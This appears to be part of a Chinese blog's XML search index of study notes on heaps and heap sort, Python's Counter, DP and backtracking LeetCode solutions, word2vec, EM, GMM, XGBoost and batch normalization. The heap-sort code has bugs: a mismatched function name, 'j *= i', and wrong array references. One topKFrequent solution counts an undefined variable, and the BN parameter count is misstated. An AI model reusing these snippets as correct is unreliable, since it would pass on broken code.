    <content type="text"><![CDATA[堆相关知识​ 堆是一种特殊的完全二叉树，其父节点的值都比子节点的大(大根堆)， 注意：堆的孩子节点左右无大小关系 相关知识：完全二叉树​ 性质：1.完全二叉树的深度为logn ​ 2.最后一个非叶子节点为n//2 ​ 3.一个编号为x的节点父节点的编号为x//2 ​ 4.一个编号为x的左孩子节点为2*x ​ 完全二叉树一般都存储在数组中，但是由于二叉树节点的序号是从1开始的，数组索引是从0开始的，所以需要将恰其全部向后移动一位，将索引为0的位空出来，从1开始计数，但是在python中数组因为没有appendleft方法，因此一般采用colllections中的deque链表类来进行存储(因为其有appendleft方法，直接在首位添加空位) 123from collections import dequeL = deque([50, 16, 30, 10, 60, 90, 2, 80, 70])L.appendleft(0) ​ 堆操作​ 性质：1.插入新元素的时间复杂度为logn，比较次数就是完全二叉树的深度 插入元素​ 直接将新元素插入到末尾，再根据情况判断新元素是否需要上移，直到满足堆的特性为止。如果堆的大小为N（即有N个元素），那么插入一个新元素所需要的时间也是O(logN)。 ​ 下面以在小根堆中插入新节点为例： 12345678910111213heap.append(i)def insert_heapq(i): flag = 0 #标志是否还需要进行向上调整 if i==1: return while i!=1 and flag==0: if heap[i]&lt;heap[i//2]: heap[i],heap[i//2] = heap[i//2],heap[i] else: flag = 1 i = i//2 建立堆​ 建立堆最自然的思路就是从空的堆开始不断向堆中添加元素，直到所有数据都被插入堆中，此时由于插入每个元素的时间复杂度为O(logi)，所以插入全部数据的时间复杂度为O(nlogn) ​ 而真正的堆建立往往采取另外一种更加高效的时间复杂度为O(n)的方法来进行，即直接先将全部数放入完全二叉树,然后在这个棵完全二叉树中，我们从最后一个结点开始依次判断以这个结点为根的子树是否符合最小堆的特性。如果所有的子树都符合最小堆的特性，那么整棵树就是最小堆了。 ​ 具体做法如下： ​ 首先我们从叶结点开始。因为叶结点没有儿子，所以所有以叶结点为根结点的子树（其实这个子树只有一个结点）都符合最小堆的特性（即父结点的值比子结点的值小）。这些叶结点压根就没有子节点，当然符合这个特性。因此所有叶结点都不需要处理，直接跳过。从第n/2个结点开始（n为完全二叉树的结点总数，这里即7号结点）处理这棵完全二叉树。（这里用到了完全二叉树的性质：最后一个非叶结点是第n/2个结点)。 12345678910111213141516171819202122232425#调整编号为n的节点符合堆结构(这里是最小堆)def head_adjust(i,end): tmp = L[i] j = i*2 #j是i的左子节点索引 while j&lt;=end: if j&lt;end and heap[j]&gt;heap[j+1]: j = j+1 #这里是比较两个孩子，将比较小的索引付给j if heap[j]&lt;heap[i]: #比较该节点和孩子中比较小的，如该节点比孩子中比较小的大，那么交换两个节点 heap[i],heap[j] = heap[j],heap[i] i = j j *= i else: #如果比孩子中较小的还小，说明一符合堆特性，不必继续向下遍历 break #由于是自下向上的，如果该节点移到的位置已经比两个子节点都小，那么他们也一定比孩子的孩子小#从一个列表创建一个堆def create_heap(L): from collections import deque heap =deque(L) heap.appendleft(0) length = len(heap)-1 last_no_leaf_index = length//2 for i in range(last_no_leaf_index): heap_adjust(last_no_leaf_index-i,length) 堆排序​ 平均时间复杂度：O(nlogn) ​ 最坏时间复杂度：O(nlogn) 时间复杂度主要是由于建立好堆后输出排序时，每输出一个结果要将一个数据从头向下比较，时间为O(logn)，有n次比较，因此总的时间复杂度为O(nlogn) ​ 堆排序的核心思想如下： 首先将待排序的数组构造出一个小根堆 取出这个小根堆的堆顶节点(最小值)，与堆的最下最右的元素进行交换，然后把剩下的元素再构造出一个小根堆 重复第二步，直到这个小根堆的长度为1，此时完成排序。 ​ 这里第一步就是小根堆的建立过程，上面已经有了，不在赘述，下面是第二、三不断交换完成啊排序的过程： 123456for i in range(length-1): heap[i],heap[length-i] = heap[length-i],heap[i] heap_adjust(i,length-i) #每次都会有一个元素相当于已经输出，从后向前依次 result = [L[i] for i in range(1,length+1)] return result ​ 因此整个堆排序过程为: 123456789101112131415161718192021222324252627282930313233#调整编号为n的节点符合堆结构(这里是最小堆)def head_adjust(i,end): tmp = L[i] j = i*2 #j是i的左子节点索引 while j&lt;=end: if j&lt;end and heap[j]&gt;heap[j+1]: j = j+1 #这里是比较两个孩子，将比较小的索引付给j if heap[j]&lt;heap[i]: #比较该节点和孩子中比较小的，如该节点比孩子中比较小的大，那么交换两个节点 heap[i],heap[j] = heap[j],heap[i] i = j j *= i else: #如果比孩子中较小的还小，说明一符合堆特性，不必继续向下遍历 break #由于是自下向上的，如果该节点移到的位置已经比两个子节点都小，那么他们也一定比孩子的孩子小#从一个列表创建一个堆def heap_sort(L): #创建堆 from collections import deque heap =deque(L) heap.appendleft(0) length = len(heap)-1 last_no_leaf_index = length//2 for i in range(last_no_leaf_index): heap_adjust(last_no_leaf_index-i,length) #输出堆的各个元素 for i in range(length-1): heap[i],heap[length-i] = heap[length-i],heap[i] heap_adjust(i,length-i) #每次都会有一个元素相当于已经输出，从后向前依次 result = [L[i] for i in range(1,length+1)] return result python中内置的堆​ python中只内置了小根堆，要使用大根堆的功能，可以将数转化成对应的负值进行堆操作，出堆时再取负值即为原来的最大值 python中的堆引用： 1import heapq 常用方法： 1.heapq.heapify(list) 将一个列表、元组穿换成小根堆对象，后续可以直接用堆操作 2.heapq.heappop(heap) 将堆顶元素出堆 堆常见题目1.前K个高频的单词给一非空的单词列表，返回前 k 个出现次数最多的单词。 返回的答案应该按单词出现频率由高到低排序。如果不同的单词有相同出现频率，按字母顺序排序。 示例 1： 1234输入: ["i", "love", "leetcode", "i", "love", "coding"], k = 2输出: ["i", "love"]解析: "i" 和 "love" 为出现次数最多的两个单词，均为2次。 注意，按字母顺序 "i" 在 "love" 之前。 示例 2： 1234输入: ["the", "day", "is", "sunny", "the", "the", "the", "sunny", "is", "is"], k = 4输出: ["the", "is", "sunny", "day"]解析: "the", "is", "sunny" 和 "day" 是出现次数最多的四个单词， 出现次数依次为 4, 3, 2 和 1 次。 分析：本题的主要难点在出现频率相同的但此处理上 解法一：利用Counter进行排序 关键点：使用Couner进行词频统计后如何进行排序，这里的排序只能使用频率的负值和首字母进行升序排序。为什么仔细进行思考，例:[“i”, “love”, “leetcode”, “i”, “love”, “coding”] 123456789def topKFrequent(self, words: List[str], k: int) -&gt; List[str]: from collections import Counter result = [] word_list = list(Counter(words).most_common()) word_list = sorted(word_list,key=lambda x:[-x[1],x[0]]) #这里的排序使用只能使用频率的负值进行排序和首字母进行升序排序 for i in range(k): result.append(word_list[i][0]) return result 解法二：使用headp进行堆排序 12345678def topKFrequent(self, words: List[str], k: int) -&gt; List[str]: import collections count = collections.Counter(nums) heap = [(-freq, word) for word, freq in count.items()] import heapq heapq.heapify(heap) return [heapq.heappop(heap)[1] for _ in range(k)]]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python——Counter对象]]></title>
    <url>%2F2019%2F04%2F14%2Fpython%E2%80%94%E2%80%94Counter%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[​ Counter对象就是python内部的一个计数器，常用来统计列表、字符串中各个字符串出现的频次，以及找到出现频次最该以及最低的元素 ​ 使用前必须先引入引用： 1from collections import Counter ​ 下面介绍在日常使用过程中常见的用法： 1.统计列表和字符串中各个元素出现的频数12345678s = "acfacs"l = [1,1,2,4,2,7]print(Counter(s))print(Counter(l))output: Counter(&#123;'c': 2, 'a': 2, 's': 1, 'f': 1&#125;) Counter(&#123;1: 2, 2: 2, 4: 1, 7: 1&#125;) 2.获取最高频的N个元素及频数​ Counter对象的most_common方法可以获取列表和字符串的前N高频的元素及频次。 most_common: ​ param n:前几个高频对象，从1开始，默认为全部，也就相当于按照频数排序 ​ return list:按照出现的频数高低已经排好序的前N个列表，列表的元素是两元组，第一项代表元素，第二项代表频率 12345s = "acfacs"print(Counter(s).most_common(1))output: [('c', 2)]]]></content>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——动态规划和回溯法]]></title>
    <url>%2F2019%2F04%2F13%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%92%8C%E5%9B%9E%E6%BA%AF%E6%B3%95%2F</url>
    <content type="text"><![CDATA[动态规划DP​ 基本思想也是将待求解问题分解成若干个子问题，先求解子问题，然后从这些问题的解得到原问题的解。与分治法不同的是，适合于用动态规划求解的问题，经分解得到子问题往往不是互相独立的。 ​ 核心：找到递推公式 二维递归1.背包问题2.分割等和子数组(也会背包问题)给定一个只包含正整数的非空数组。是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。 注意: 每个数组中的元素不会超过 100 数组的大小不会超过 200 示例 1: 12345输入: [1, 5, 11, 5]输出: true解释: 数组可以分割成 [1, 5, 5] 和 [11]. ​ 本题是一个经典的动态规划问题的题型——0/1背包问题,背包的大小为sum(nums)/2。该问题首先要我们初始化一个数组w，w[i]代表能否将背包填充到i，而能将背包填充到i有两种方式，一种是直接使用i大小的块，第二是使用多个小块，因此我们可以总结出递推公式： ​ w[i] = w[i]||w[i-num] ​ 这个递推公式用程序表示就是： 123for num in nums: for i in range(c, num - 1, -1): w[i] = w[i] or w[i - num] ​ 举例来说： ​ 对于输入[1,5,11,5]来说，​ 当num=1时，通过递推式只能得到w[1]=true​ 当num=5时，通过递推式能够得到w[5]=true,w[6]=true，因为可以通过1+5组合​ 当num=5时，通过递推式能够得到新的w[11]=true（5+6=11）​ 当num=11时，没有新改动w​ 所以此时可以发现w[11]=true，所以可以等分 123456789101112131415def canPartition(self, nums) -&gt; bool: # 计算总价值 c = sum(nums) # 奇数直接排除 if c % 2 != 0: return False c = c // 2 w = [False] * (c + 1) # 第0个位置设置为true，表示当元素出现的时候让w[i-num]为True,也就是w[i]为True w[0] = True for num in nums: for i in range(c, num - 1, -1): w[i] = w[i] or w[i - num] return w[c] ​ 当然本题也就可以使用BST，但是时间复杂度太高，leetcode没过 回溯法-深度优先搜索BST​ 在包含问题的所有解的解空间树中，按照深度优先搜索的策略，从根结点出发深度探索解空间树。当探索到某一结点时，要先判断该结点是否包含问题的解，如果包含，就从该结点出发继续探索下去，如果该结点不包含问题的解，则逐层向其祖先结点回溯。 ​ 核心：暴力遍历 1.求解一个集合的全部子集给定一组不含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。 说明：解集不能包含重复的子集。 示例: 123456789101112输入: nums = [1,2,3]输出:[ [3], [1], [2], [1,2,3], [1,3], [2,3], [1,2], []] ​ 找子集相关问题的BST基本上采用的核心思想：每个位置都可能出现采用或者不采用两种情况，而如果可能出现重复的元素，那么就要事先将原数组进行排序，存进result之前判断是否已有 1234567891011121314151617181920def subsets(self, nums): """ :type nums: List[int] :rtype: List[List[int]] """ def core(nums,i,tmp): if i==length: result.append(tmp) return #每次向后遍历时有两种情况，一种是将当前节点值加入到tmp中，一种是不加入 core(nums,i+1,tmp+[nums[i]]) core(nums,i+1,tmp) nums.sort() length = len(nums) result = [] core(nums,0,[]) return result 拓展：含重复的子集 1234567891011121314151617181920def subsetsWithDup(self, nums): """ :type nums: List[int] :rtype: List[List[int]] """ def core(nums,i,tmp): if i==length: if tmp not in result: result.append(tmp) return core(nums,i+1,tmp) core(nums,i+1,tmp+[nums[i]]) length = len(nums) result = [] nums.sort() #这里必须要先排序 core(nums,0,[]) return result 2.全排列给定一个没有重复数字的序列，返回其所有可能的全排列。 示例: 12345678910输入: [1,2,3]输出:[ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1]] 12345678910111213141516class Solution: def permute(self, nums: List[int]) -&gt; List[List[int]]: def core(nums,tmp): if nums==[]: result.append(tmp) return for num in nums: s = nums[::] s.remove(num) core(s,tmp+[num]) result = [] core(nums,[]) return result 拓展：含重复数组的全排列 12345678910111213141516171819def permuteUnique(self, nums: List[int]) -&gt; List[List[int]]: def core(nums,tmp): if nums==[]: if tmp not in result: result.append(tmp) return for num in nums: s = nums[::] s.remove(num) core(s,tmp+[num]) result = [] nums.sort() core(nums,[]) return result 3.划分为k个相等的子集给定一个整数数组 nums 和一个正整数 k，找出是否有可能把这个数组分成 k 个非空子集，其总和都相等。 示例 1： 123输入： nums = [4, 3, 2, 3, 5, 2, 1], k = 4输出： True说明： 有可能将其分成 4 个子集（5），（1,4），（2,3），（2,3）等于总和。 12345678910111213141516171819202122232425262728293031def canPartitionKSubsets(self, nums: List[int], k: int) -&gt; bool: if k == 1: return True #如果不能被k整除，那么直接无解 sum_num = sum(nums) if sum_num % k != 0: return False avg = sum_num // k nums.sort(reverse=True) n = len(nums) if n &lt; k :return False visited = set() #标志位，标志哪个位置已经被使用过了 def dfs(k,tmp_sum,loc): #当选用的几个数之和等于目标值，那么k减一，再找下一个子集 if tmp_sum == avg: return dfs(k-1,0,0) #如果k==1，由于上面已经验证过可以被k整除，因此一定成立 if k == 1: return True for i in range(loc,n): if i not in visited and nums[i] + tmp_sum &lt;= avg: visited.add(i) if dfs(k,tmp_sum+nums[i],i+1): return True visited.remove(i) return False return dfs(k,0,0)]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度学习——词向量表示之word2vec]]></title>
    <url>%2F2019%2F04%2F12%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E8%AF%8D%E5%90%91%E9%87%8F%E8%A1%A8%E7%A4%BA%E4%B9%8Bword2vec%2F</url>
    <content type="text"><![CDATA[原始的神经网络语言模型：里面一般有三层，输入层（词向量），隐藏层和输出层（softmax层），里面最大的问题在于从隐藏层到输出的softmax层的计算量很大，因为要计算所有词的softmax概率，再去找概率最大的值 Word2Vec对原始语言模型的改进： 1.对于从输入层到隐藏层的映射，没有采取神经网络的线性变换加激活函数的方法，而是采用简单的对所有输入词向量求和并取平均的方法。 比如输入的是三个4维词向量：(1,2,3,4),(9,6,11,8),(5,10,7,12)(1,2,3,4),(9,6,11,8),(5,10,7,12),那么我们word2vec映射后的词向量就是(5,6,7,8)(5,6,7,8)。由于这里是从多个词向量变成了一个词向量。 2.word2vec采样了霍夫曼树来代替从隐藏层到输出softmax层的映射（Hierarchical Softmax）。这样隐藏层到输出层的softmax不是一步完成的，而是沿着哈弗曼树一步一步完成的。 Hierarchical Softmax​ 和之前的神经网络语言模型相比，我们的霍夫曼树的所有内部节点就类似之前神经网络隐藏层的神经元,其中，根节点的词向量对应我们的投影后的词向量，而所有叶子节点就类似于之前神经网络softmax输出层的神经元，叶子节点的个数就是词汇表的大小。 使用Hierarchical Softmax的好处 1.由于是二叉树，之前计算量为V,现在变成了log2V 2.由于使用霍夫曼树是高频的词靠近树根，这样高频词需要更少的时间会被找到。 算法过程STEP 1：扫描语料库，统计每个词出现的频数，保存在一个hash表中 STEP2：根据个词的词频建立哈弗曼树 最终每个词汇都是哈弗曼树的叶子节点，词频就是相应的权值 根节点对应的词向量就是我们投影后的词向量 而所有叶子节点就类似神经网络softmax输出层的神经元，叶子节点个数就是词汇表大小 非叶子节点代表某一类词 哈弗曼树建立好后每个词都会有一个二进制的哈弗曼编码 STEP3：初始化词向量和哈弗曼树非叶子节点的向量 ​ 向量维度是我们给定的参数K。 STEP4：训练，也就是通过梯度下降算法不断优化词向量 ​ 在初始化后的词向量，回到语料库，逐句读取一系列的词，然后用梯度下降算法算法算出梯度，更新词向量的值、非叶子检点的值。(哈弗曼树就相当于一个优化后的神经网络) 参数更新过程基于Negative Sampling的Word2vecHierarchical Softmax的的缺点： ​ 对于生僻词需要在哈弗曼树中向下走很久。 Negative Sampling算法​ Negative Sampling不再使用(复杂的Huffman树），而是利用相对简单的随机负采样，能大幅度提升性能，因此，将其作为Hierarchical softmax的替代方案 ​ 核心思想：通过负采样将问题转化为求解一个正例和neg个负例进行二元回归问题。每次只是通过采样neg个不同的中心词做负例，就可以训练模型 ​ 方法：我们有一个训练样本，中心词是w,它周围上下文共有2c个词，记为context(w)。由于这个中心词w,的确和context(w)相关存在，因此它是一个真实的正例。通过Negative Sampling采样，我们得到neg个和w不同的中心词wi,i=1,2,..neg，这样context(w)和wi就组成了neg个并不真实存在的负例。利用这一个正例和neg个负例，我们进行二元逻辑回归，得到负采样对应每个词wi对应的模型参数θi，和每个词的词向量。 ​ 本质上是对训练集进行了采样，从而减小了训练集的大小。 Negative Sampling负采样方法 3、 word2vec负采样有什么作用？ 1.加速了模型计算，模型每次只需要更新采样的词的权重，不用更新所有的权重 2.保证了模型训练的效果，中心词其实只跟它周围的词有关系，位置离着很远的词没有关系 常见问题1.skip gram和cbow各自的优缺点 ​ (1) cbow的速度更快，时间复杂度为O(V)，skip-gram速度慢,时间复杂度为O(nV) ​ 在cbow方法中，是用周围词预测中心词，从而利用中心词的预测结果情况，使用GradientDesent方法，不断的去调整周围词的向量。cbow预测行为的次数跟整个文本的词数几乎是相等的（每次预测行为才会进行一次backpropgation, 而往往这也是最耗时的部分），复杂度大概是O(V); ​ 而skip-gram是用中心词来预测周围的词。在skip-gram中，会利用周围的词的预测结果情况，使用GradientDecent来不断的调整中心词的词向量，最终所有的文本遍历完毕之后，也就得到了文本所有词的词向量。可以看出，skip-gram进行预测的次数是要多于cbow的：因为每个词在作为中心词时，都要使用周围每个词进行预测一次。这样相当于比cbow的方法多进行了K次（假设K为窗口大小），因此时间的复杂度为O(KV)，训练时间要比cbow要长。 ​ (2)当数据较少或生僻词较多时，skip-gram会更加准确； ​ 在skip-gram当中，每个词都要收到周围的词的影响，每个词在作为中心词的时候，都要进行K次的预测、调整。因此， 当数据量较少，或者词为生僻词出现次数较少时， 这种多次的调整会使得词向量相对的更加准确。因为尽管cbow从另外一个角度来说，某个词也是会受到多次周围词的影响（多次将其包含在内的窗口移动），进行词向量的跳帧，但是他的调整是跟周围的词一起调整的，grad的值会平均分到该词上， 相当于该生僻词没有收到专门的训练，它只是沾了周围词的光而已。 2.Negative Sampling和Hierarchical softmax各自的优缺点 Hierarchical softmax 优点： ​ 1.由于是二叉树，之前计算量为V,现在变成了log2V，效率更高 ​ 2.由于使用霍夫曼树是高频的词靠近树根，这样高频词需要更少的时间会被找到。 缺点: ​ 对于生僻词在hierarchical softmax中依旧需要向下走很久 Negative Sampling 优点： ​ 1.对于低频词的计算效率依然很高 ​ 3.word2vec的缺点 1.使用的只是局部的上下文信息，对上下文的利用有限 2.和glove相比比较难并行化 ​ 4、word2vec和fastText对比有什么区别？（word2vec vs fastText） 1）都可以无监督学习词向量， fastText训练词向量时会考虑subword； 2）fastText还可以进行有监督学习进行文本分类，其主要特点： 结构与CBOW类似，但学习目标是人工标注的分类结果； 采用hierarchical softmax对输出的分类标签建立哈夫曼树，样本中标签多的类别被分配短的搜寻路径； 引入N-gram，考虑词序特征； 引入subword来处理长词，处理未登陆词问题； 参考文献：基于Negative Sampling的模型 基于Hierarchical Softmax的模型]]></content>
      <tags>
        <tag>面试</tag>
        <tag>NLP</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习——高斯混合模型GMM]]></title>
    <url>%2F2019%2F04%2F04%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E9%AB%98%E6%96%AF%E6%B7%B7%E5%90%88%E6%A8%A1%E5%9E%8BGMM%2F</url>
    <content type="text"><![CDATA[GMM 是学习出一些概率密度函数 k-means 的结果是每个数据点被 assign 到其中某一个 cluster 了，而 GMM 则给出这些数据点被 assign 到每个 cluster 的概率，又称作 soft assignment。 假设数据服从 Mixture Gaussian Distribution ，换句话说，数据可以看作是从数个 Gaussian Distribution 中生成出来的]]></content>
  </entry>
  <entry>
    <title><![CDATA[机器学习——EM算法]]></title>
    <url>%2F2019%2F04%2F04%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94EM%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[准备知识1.参数估计的方法概率模型的参数估计分为两大类： 1.不含隐变量的参数估计—极大似然估计/贝叶斯估计法 2.含隐变量的参数估计—EM算法 2.jensen不等式X是一个随机变量，f(X)是一个凸函数（二阶导数大或等于0），那么有： 当且仅当X是常数的时候等号成立 如果f（X）是凹函数，不等号反向 3.先验概率、后验概率、条件概率​ 先验概率：P(Y) 先验概率是只根据事情之前发生各个结果出现情况估计的概率(无关特征) ​ 后验概率：P(Y|X) 后验概率是在各个X的分布下各个Y出现的概率(特征符合这个X时Y为这个的概率) ​ 条件概率：P(X|Y) 条件概率是在结果某一种情况时X出现这种分布的概率 4.自信息、互信息​ 自信息：I(x) = -logp(x) ​ 概率是衡量确定性的度量，那么信息是衡量不确定性的度量.越不确定信息量越高。 ​ 互信息：I(x;y) = log(p(x|y)/p(x)) ​ 已知y，x的不确定性减少量(其值可正可负) 5.熵​ 对随机变量平均不确定性的度量，一个系统越有序，信息熵越低。 ​ 熵的另一种解读也就是自信息的期望 ​ H(X) = E[I(X)] = ∑P(x)I(x) = -∑p(x)logp(x) 6.条件熵​ 在给定y条件下，x的条件自信息量为I(x|y)，X的集合的条件熵为 ​ 进一步在给定Y（各个y）的条件下，X集合的条件熵： ​ ​ 也就是在联合符号集合上的条件自信息量两个概率的加权平均 EM算法​ EM算法主要用于求解概率模型的极大似然估计或极大后验概率。EM算法是通过迭代求解观测数据对数似然函数L(θ) = logP(Y|θ)的极大化，实现参数估计的。 每次迭代主要分为E、M两步： ​ E步：求期望。即求log(P，Z|θ)关于P(Z|Y，θi)的期望 (各个隐变量可能的概率下乘以出现这种结果的总和) ​ ​ M步：极大化Q函数得到新的参数θ ​ 在构建具体的EM算法时，最重要的时定义Q函数，每次迭代中，Em算法通过极大似然化Q函数来增大对数似然函数L(θ) 算法推导注意：1.EM算法在每次迭代后均能提高观测数据的似然函数值 ​ 2.EM算法不能保证全局最优，只能保证局部最优，因此算法受初值的影响 ​ 3.EM算法可以用于无监督学习]]></content>
      <tags>
        <tag>面试</tag>
        <tag>算法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习——XGBoost]]></title>
    <url>%2F2019%2F03%2F30%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XGBoost%2F</url>
    <content type="text"><![CDATA[XGB的优势​ 1. XGBoost加入了正则化项，正则化项中包含了叶子节点个数，使学到的模型更加简单。原始的GBDT没有，可以有效防止过拟合 ​ 2. XGBoost实现了局部并行计算，比原始的GBDT速度快的多 ​ 3. XGBoost中内置了缺失值的处理，尝试对缺失值进行分类，然后学习这种分类 ​ 4. 可在线学习，这个sklearn中的GBDT也有 ​ 5. XGboost允许在交叉验证的过程中实现boosting，通过一次run就能得到boosting迭代的优化量；而GBDT只能人工的使用grid-search ​ 6.支持列抽样。不仅能有效防止过拟合，还能减少计算量 XGBoost的并行计算是如何实现的？ ​ 注意xgboost的并行不是tree粒度的并行，xgboost也是一次迭代完成才能进行下一次迭代的（第t次迭代的代价函数里面包含了前面t-1次迭代的预测值）。xgboost的并行是在特征粒度上的。我们知道，决策树的学习最耗时的一个步骤就是对特征的值进行排序（因为要确定最佳分割点），xgboost在训练之前，预先对数据进行排序，然后保存block结构，后面的迭代中重复的使用这个结构，大大减小计算量。这个block结构也使得并行称为了可能，在进行节点的分裂时，需要计算每个特征的增益，最终选增益最大的那个特征去做分裂，那么各个特征的增益计算就可以开多线程进行。 XGBoost的参数​ XGBoost的参数主要分为三大类： 1.调控整个方程的参数 2.调控每步树的参数 3.调控优化表现的变量 1.调控整个方程的参数 booster [defalut=gbtree] 基模型 gbtree：树模型 gblinear：线性模型 nthread [default to maximum number of threads available if not set] 使用的线程数 用于并行计算，默认使用全部内核 2.调节基分类器的参数​ 这里只讨论树模型作为基模型的情况，因为树模型作为基分类器效果总是优于线性模型。 eta/learning rate [default=0.3] 学习的初始速率 通过减小每一步的权重能够使建立的模型更加具有鲁棒性 通常最终的数值范围在[0.01-0.2]之间 Shrinkage（缩减），相当于学习速率。xgboost在进行完一次迭代后，会将叶子节点的权重乘上该系数，主要是为了消弱每棵树的影响，让后面有更大的学习空间。在实际应用中，一般把学习率设置的小一点，然后迭代次数设置的大一点（补充：传统GBDT的实现也有学习速率） gamma [default=0] 一个节点分裂的条件是其分裂能够起到降低loss function的作用，gamma 定义loss function降低多少才分裂 它的值取决于 loss function需要被调节 lambda/reg_lambda [default=1] L2正则化的权重，用于防止过拟合 alpha/reg_alpha [default=0] L1正则化的权重，可以用于特征选择 一般用于特征特别多的时候，可以大大提升算法的运算效率 subsample [default=1] 每棵树使用的样本比例 [0.5~1] 低值使得模型更保守且能防止过拟合，但太低的值会导致欠拟合 colsample_bytree [default=1] 每棵树随机选取的特征的比例 [0.5-1] 3.调控优化表现的参数 objective [default=reg:linear] eval_metric seed 调参调参开始时一般使用较大的学习速率 0.1 1.初始参数设置 max_depth = 5 min_child_weight = 1 #如果是不平衡数据，初始值设置最好小于1 2.首先调节的参数 max_depth和min_child_weight​ 在整个GBDT中，对整个模型效果影响最大的参数就是max_depth和min_child_weight。 max_depth 一般在3~10先用step为2进行网格搜索找到范围，找到范围再用step为1的网格搜索确定具体值 min_child_weight 一般现在1~6先使用step为2的网格搜索找到最佳参数值范围，然后再用step为1的网格索索确定具体参数值 3. 调整gamma gamma参数主要用于控制节点是否继续分裂，一般使用网格搜索在0~0.5之间进行步长为0.1的搜索 4.调整subsample和colsample_bytree 这两个参数主要是用来防止拟合的，参数值越小越能防止过拟合 一般0.6~1之间网格搜索 5.尝试降低学习速率增加更多的树 学习速率降为0.1或0.01 结论：1.仅仅通过调参来提升模型效果是很难的 ​ 2.要想提升模型效果最主要是通过特征工程、模型融合等方式]]></content>
      <tags>
        <tag>机器学习</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度学习-BN]]></title>
    <url>%2F2019%2F03%2F28%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-BN%2F</url>
    <content type="text"><![CDATA[为什么要进行归一化？ ​ 原因在于神经网络的本身就在于学习数据的分布，一旦训练数据和测试数据分布不同，那么网络的泛化能力也将大大降低；另外一方面，再使用BSGD时一旦每批训练数据的分布不相同，那么网络在每次进行迭代时都要去适应不同的数据分布，这将大大降低网络的学习速度。 为什么要使用BN？ ​ 这主要是因为对于一般的归一化，只是在输入网络之前对数进行了归一化，而在神经网络的训练过程中并没有对数据做任何处理，而在神经网络的的训练过程中只要网络的前面几层的数据分布发生微小的变化，那么后面的网络就会不断积累放大这个分布的变化，因此一旦有任意一层的数据发生改变，这层以及后面的网络都会需要去从新适应学习这个新的数据分布，而如果训练过程中，每一层的数据都在不断发生变化，那么更将大大影响网络的训练速度，因此需要在网络的每一层输入之前都将数据进行一次归一化，保证数据分布的相同，加快网络训练速度。 ​ 在另一方面，由于将网络的每一步都进行了标准化，数据分布一致，因此模型的泛化能力将更强。 BN的本质是什么？ 一个可学习、有参数（γ、β）的使每层数据之前进行归一化的网络层 BN使用位置 线性层后全连接层之前 BN过程 对于一般的归一化没使用下面的公式进行归一化计算： ​ 但是如果仅仅使用上面的公式来对某层的输出做下一层的输入做归一化，那么是会影响到前面一层学习到的特征的。例如：网络中间某一层学习到特征数据本身就分布在S型激活函数的两侧，强制把它归一化处理、标准差也限制在了1，把数据变换成分布于s函数的中间部分，这样就相当于我这一层网络所学习到的特征分布被搞坏了。因此，BN引入了可学习的参数γ、β： ​ ​ 上面的公式表明，通过学习到的重构参数γ、β，是可以恢复出原始的某一层所学到的特征的。 BN中为什么要在后面γ、β？不加可以吗？ ​ 不可以，因为这是BN中的最关键步骤。不使用γ、β会造成归一化的同时破坏前一层提取到的特征，而BN通过记录每个神经元上的γ、β，使前一层的特征可以通过γ、β得以还原。 BN层是对每一个神经元归一化处理，那在CNN的BN层是怎么应用的？是不参数个数会非常多？ ​ 对于CNN上采用了类似权值共享的策略，将一个特征图看做一个神经元，因此参数个数并不会很多。 例如：如果min-batch sizes为m，那么网络某一层输入数据可以表示为四维矩阵(m,f,w,h)，m为min-batch sizes，f为特征图个数，w、h分别为特征图的宽高。在CNN中我们可以把每个特征图看成是一个特征处理（一个神经元），因此在使用Batch Normalization，mini-batch size 的大小就是：m.w.h，于是对于每个特征图都只有一对可学习参数：γ、β，总参数个数也就是2m个。 BN的作用 1.防止过拟合。有了BN，dropout和正则化的需求下降了 2.加速训练 BN算法是如何加快训练和收敛速度的呢？ BN算法在实际使用的时候会把特征给强制性的归到均值为0，方差为1的数学模型下。深度网络在训练的过程中，如果每层的数据分布都不一样的话，将会导致网络非常难收敛和训练，而如果能把每层的数据转换到均值为0，方差为1的状态下，一方面，数据的分布是相同的，训练会比较容易收敛，另一方面，均值为0，方差为1的状态下，在梯度计算时会产生比较大的梯度值，可以加快参数的训练，更直观的来说，是把数据从饱和区直接拉到非饱和区。更进一步，这也可以很好的控制梯度爆炸和梯度消失现象，因为这两种现象都和梯度有关。 BN算法为什么能防止过拟合？ 在训练中，BN的使用使得一个mini-batch中的所有样本都被关联在了一起，因此网络不会从某一个训练样本中生成确定的结果。]]></content>
      <tags>
        <tag>面试</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——二叉树遍历]]></title>
    <url>%2F2019%2F03%2F19%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E4%BA%8C%E5%8F%89%E6%A0%91%E9%81%8D%E5%8E%86%2F</url>
